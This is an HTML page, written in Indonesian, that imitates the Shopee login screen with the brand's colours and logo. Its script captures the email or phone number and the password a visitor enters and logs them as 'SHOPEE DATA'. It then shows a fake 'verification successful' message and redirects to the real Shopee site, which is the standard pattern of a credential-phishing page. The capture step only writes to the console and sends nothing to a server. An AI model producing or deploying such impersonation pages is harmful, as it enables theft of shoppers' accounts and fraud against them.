<!DOCTYPE html>
<html>
<head>
    <title>Shopee - Login</title>
    <style>
        body{font-family:Arial;background:#ff6b00;margin:0;padding:20px;}
        .box{max-width:400px;margin:40px auto;background:white;padding:30px;border-radius:10px;}
        .logo{text-align:center;margin-bottom:20px;}
        .logo img{width:120px;}
        input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;}
        button{width:100%;padding:12px;background:#ff6b00;color:white;border:none;border-radius:4px;font-weight:bold;}
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg">
        </div>
        <h3>Login ke Shopee</h3>
        <form id="shopeeForm">
            <input type="text" placeholder="Email/No HP" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">LOGIN</button>
        </form>
    </div>

    <script>
    document.getElementById('shopeeForm').onsubmit = function(e) {
        e.preventDefault();
        const data = {
            email: this.querySelector('[type="text"]').value,
            pass: this.querySelector('[type="password"]').value
        };
        console.log('SHOPEE DATA:', data);
        alert('Verifikasi berhasil!');
        setTimeout(() => location.href = 'https://shopee.co.id', 1000);
    };
    </script>
</body>
</html>
